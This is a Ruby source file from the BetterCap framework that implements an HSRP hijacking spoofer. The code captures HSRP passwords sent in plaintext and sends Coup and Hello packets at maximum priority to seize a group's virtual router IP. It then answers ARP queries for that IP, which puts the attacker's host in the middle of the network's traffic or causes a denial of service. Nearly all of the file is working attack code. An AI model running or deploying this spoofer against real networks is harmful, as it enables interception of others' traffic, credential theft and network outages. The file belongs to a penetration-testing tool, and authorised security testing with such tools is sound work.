# encoding: UTF-8
=begin

BETTERCAP

Author : Simone 'evilsocket' Margaritelli
Email  : evilsocket@gmail.com
Blog   : https://www.evilsocket.net/

Cisco Hot Standby Router Protocol (HSRP) spoofer:
  Author : Brendan Coles
  Email  : bcoles[at]gmail.com

This project is released under the GPL 3 license.

=end

module BetterCap
module Spoofers
#
# This class is responsible for performing HSRP hijacking on the network.
#
# * Supports IPv4
# * Supports text authentication
# * Does not support IPv6
# * Does not support MD5 authentication
#
# This spoofer watches incoming HSRP message broadcasts
# looking for vulnerable HSRP groups using text authentication.
#
# If such a group is identified, the spoofer launches a coup against
# the active router, advising the group that the +ctx+ interface wishes
# to become the active router for the group's virtual IP address.
#
# The spoofer then proves the +ctx+ interface is the superior router
# by sending a 'Hello' packet with the highest possible priority,
# winning the election, and causing the the other routers participating
# in the group to stand down, falling back to StandBy or Listen modes.
#
# As a result, the group members will no longer reply to ARP queries
# for the group's virtual IP address.
#
# The 'Hello' packet is then re-broadcast periodically to ensure the
# group members comply with the new doctrine.
#
# A gratuitous ARP reply is broadcast, notifying the network of the
# new MAC address for the virtual IP address.
#
# The spoofer then adds the group's details to a list of controlled
# groups, and replies to any ARP queries for their associated virtual
# IP addresses.
#
# Upon termination of the spoofer, a 'Resign' packet is broadcast,
# at which time the group member in StandBy mode should resume the
# active role.
#
# Note: If the active router in the group already has the highest
#       possible priority, the spoofer will wait until a lower
#       priority router is elected as the active router.
#
# Note: If something goes wrong, the spoofer will likely cause a
#       denial of service until a member of the group assumes the
#       the role of active router, and the group's clients retrieve
#       a fresh ARP lease for the virtual IP address.
#
# References:
# - https://www.ietf.org/rfc/rfc2281.txt
# - http://packetlife.net/blog/2008/oct/27/hijacking-hsrp/
#
class Hsrp < Base
  # Initialize the BetterCap::Spoofers::HSRP object.
  def initialize
    @ctx          = Context.get
    @forwarding   = @ctx.firewall.forwarding_enabled?
    @spoof_thread = nil
    @hsrp_thread  = nil
    @arp_thread   = nil
    @running      = false

    # HelloTime - Time (in seconds) between Hello messages
    @hellotime = 3 # default

    # HoldTime - Time (in seconds) for which the Hello message is valid
    @holdtime = 255 # max

    # Table of HSRP groups
    @groups = []

    update_gateway!
  end

  # Start the HSRP spoofing
  def start
    Logger.debug "Starting HSRP spoofer ..."

    stop() if @running
    @running = true

    if @ctx.options.spoof.kill
      Logger.warn 'Disabling packet forwarding.'
      @ctx.firewall.enable_forwarding(false) if @forwarding
    else
      @ctx.firewall.enable_forwarding(true) unless @forwarding
    end

    @hsrp_thread = Thread.new { hsrp_watcher }
    @arp_thread = Thread.new { arp_watcher }
    @spoof_thread = Thread.new { hsrp_spoofer }
  end

  # Stop the HSRP spoofing and reset firewall state
  def stop
    raise 'HSRP spoofer is not running' unless @running

    Logger.debug 'Stopping HSRP spoofer ...'

    @running = false
    begin
      @spoof_thread.exit
    rescue
    end

    # Send a few resign packets
    @groups.each do |vip, group, password|
      3.times do
        send_resign vip, group, password
      end
    end

    Logger.debug "Resetting packet forwarding to #{@forwarding} ..."

    @ctx.firewall.enable_forwarding( @forwarding )
  end

  private

  # Broadcast a HSRP Coup packet (OpCode 0x01)
  def send_coup(vip, group, password)
    Logger.debug "[#{'HSRP'.green}] Launching a coup in group '#{group}' for ownership of virtual IP #{vip.to_x} ..."
    pkt = PacketFu::HSRPPacket.new
    pkt.eth_saddr = @ctx.iface.mac
    pkt.eth_daddr = '01:00:5e:00:00:02'
    pkt.eth_proto = 0x0800

    pkt.ip_saddr = @ctx.iface.ip
    pkt.ip_daddr = '224.0.0.2'
    pkt.ip_ttl   = 1
    pkt.ip_recalc

    pkt.udp_src = 1985
    pkt.udp_dst = 1985

    pkt.hsrp_opcode = 1     # Coup
    pkt.hsrp_priority = 255 # Highest priority
    pkt.hsrp_state = 16     # Active
    pkt.hsrp_hellotime = @hellotime
    pkt.hsrp_holdtime = @holdtime
    pkt.hsrp_group = group
    pkt.hsrp_password = password
    pkt.hsrp_vip = vip.to_s

    pkt.udp_recalc
    pkt.ip_recalc
    @ctx.packets.push(pkt)
  end

  # Broadcast a HSRP Hello packet (OpCode 0x00)
  def send_hello(vip, group, password)
    pkt = PacketFu::HSRPPacket.new
    pkt.eth_saddr = @ctx.iface.mac
    pkt.eth_daddr = '01:00:5e:00:00:02'
    pkt.eth_proto = 0x0800

    pkt.ip_saddr = @ctx.iface.ip
    pkt.ip_daddr = '224.0.0.2'
    pkt.ip_ttl   = 1
    pkt.ip_recalc

    pkt.udp_src = 1985
    pkt.udp_dst = 1985

    pkt.hsrp_opcode = 0     # Hello
    pkt.hsrp_priority = 255 # Highest priority
    pkt.hsrp_state = 16     # Active
    pkt.hsrp_hellotime = @hellotime
    pkt.hsrp_holdtime = @holdtime
    pkt.hsrp_group = group
    pkt.hsrp_password = password
    pkt.hsrp_vip = vip.to_s

    pkt.udp_recalc
    pkt.ip_recalc
    @ctx.packets.push(pkt)
  end

  # Broadcast a HSRP Resign packet (OpCode 0x02) with Listen state (0x02)
  def send_resign(vip, group, password)
    Logger.debug "[#{'HSRP'.green}] Resigning position as active router for group '#{group}' (VirtualIP=#{vip.to_x}) ..."

    pkt = PacketFu::HSRPPacket.new
    pkt.eth_saddr = @ctx.iface.mac
    pkt.eth_daddr = '01:00:5e:00:00:02'
    pkt.eth_proto = 0x0800

    pkt.ip_saddr = @ctx.iface.ip
    pkt.ip_daddr = '224.0.0.2'
    pkt.ip_ttl   = 1
    pkt.ip_recalc

    pkt.udp_src = 1985
    pkt.udp_dst = 1985

    pkt.hsrp_opcode = 2     # Resign
    pkt.hsrp_priority = 255 # Highest priority
    pkt.hsrp_state = 2      # Listen
    pkt.hsrp_hellotime = @hellotime
    pkt.hsrp_holdtime = @holdtime
    pkt.hsrp_group = group
    pkt.hsrp_password = password
    pkt.hsrp_vip = vip.to_s

    pkt.udp_recalc
    pkt.ip_recalc
    @ctx.packets.push(pkt)
  end

  private

  # Main spoofer loop.
  def hsrp_spoofer
    while true
      unless @groups.empty?
        Logger.debug "[#{'HSRP'.green}] Sending HSRP 'Hello' broadcast to #{@groups.size} HSRP groups ..."
      end

      @groups.each do |vip, group, password|
        send_hello vip, group, password
      end

      sleep @hellotime
    end
  end

  # Watches for incoming HSRP messages with text authentication.
  #
  # If text authentication is identified, launches a coup
  # against the active router in the HSRP group and claims the
  # role of the active router.
  def hsrp_watcher
    Logger.debug 'HSRP watcher started ...'

    sniff_packets('udp and port 1985') do |pkt|
      # We're only interested in HSRP 'Hello' packets (OpCode 0x00) from other hosts
      next unless (pkt.is_hsrp? && pkt.hsrp_opcode == 0 && pkt.ip_saddr.to_s != @ctx.iface.ip)

      vip      = pkt.hsrp_vip
      group    = pkt.hsrp_group
      password = pkt.hsrp_password

      # Ignore this message if we're already the active router for the group
      next if @groups.include? [vip, group, password]

      Logger.debug "[#{'HSRP'.green}] Received 'Hello' from #{pkt.ip_saddr.to_s} in group '#{group}' using text authentication (VirtualIP=#{vip.to_x} Group=#{group} Password=#{password})"

      # Dump the packet for debugging purposes
      #Logger.debug pkt.inspect

      # Do not proceed if the active router has the highest possible priority
      if pkt.hsrp_priority >= 255
        Logger.debug "[#{'HSRP'.green}] Cannot overthrow #{pkt.ip_saddr.to_s} - priority 255 is too high. Ignoring ..."
        next
      end

      # Let the user know the coup has begun
      Logger.info "[#{'HSRP'.green}] #{"Claiming role as active router for group '#{group}' ...".yellow}"

      # Overthrow the active router for the HSRP group
      send_coup vip, group, password

      # Broadcast a gratuitous ARP reply notifying the network
      # of the new MAC address for the virtual IP address
      Logger.info "[#{'ARP'.green}] #{"Broadcasting MAC #{@ctx.iface.mac} for virtual IP #{vip.to_x} ...".yellow}"
      send_arp_reply vip.to_x, @ctx.iface.mac, vip.to_x, 'FF:FF:FF:FF:FF:FF'

      # Add the HSRP group to the list of groups under our control
      @groups << [vip, group, password]
    end
  end

  # Watches for incoming ARP queries
  #
  # If the query is for a HSRP virtual IP address
  # under our control, replies with +ctx+ interface.
  def arp_watcher
    Logger.debug 'HSRP ARP watcher started ...'

    sniff_packets('arp') do |pkt|
      # We're only interested in ARP queries from other hosts
      next unless is_arp_query?(pkt)

      saddr = pkt.arp_src_ip.to_s
      daddr = pkt.arp_dst_ip.to_s
      smac  = pkt.arp_src_mac.to_s

      Logger.info "[#{'ARP'.green}] #{saddr} is asking who #{daddr} is."

      # The client wants to know who we are...
      # Send an ARP reply telling the client our MAC
      if pkt.arp_dst_ip.to_s == @ctx.iface.ip
        send_arp_reply @ctx.iface.ip, @ctx.iface.mac, saddr, smac
        next
      end

      # The client wants to know who someone else is...
      @groups.each do |group|
        # Are they looking for one of the virtual IP addresses we control?
        if group.include? daddr
          # Yes - Send an ARP reply claiming to be the owner of the virtual IP
          send_arp_reply daddr, @ctx.iface.mac, saddr, smac
        end
      end
    end
  end

  # Send an ARP reply to the target identified by the +daddr+ IP address
  # and +dmac+ MAC address.
  def send_arp_reply(saddr, smac, daddr, dmac)
    pkt = PacketFu::ARPPacket.new
    pkt.eth_saddr = smac
    pkt.eth_daddr = dmac
    pkt.arp_saddr_mac = smac
    pkt.arp_daddr_mac = dmac
    pkt.arp_saddr_ip = saddr
    pkt.arp_daddr_ip = daddr
    pkt.arp_opcode = 2

    @ctx.packets.push(pkt)
  end

  # Return true if the +pkt+ packet is an ARP 'who-has' query
  def is_arp_query?(pkt)
    # we're only interested in 'who-has' packets from other hosts
    return ( pkt.arp_opcode == 1 && \
             pkt.arp_dst_mac.to_s == '00:00:00:00:00:00' && \
             pkt.arp_src_ip.to_s != @ctx.iface.ip )
  rescue
    false
  end
end
end
end
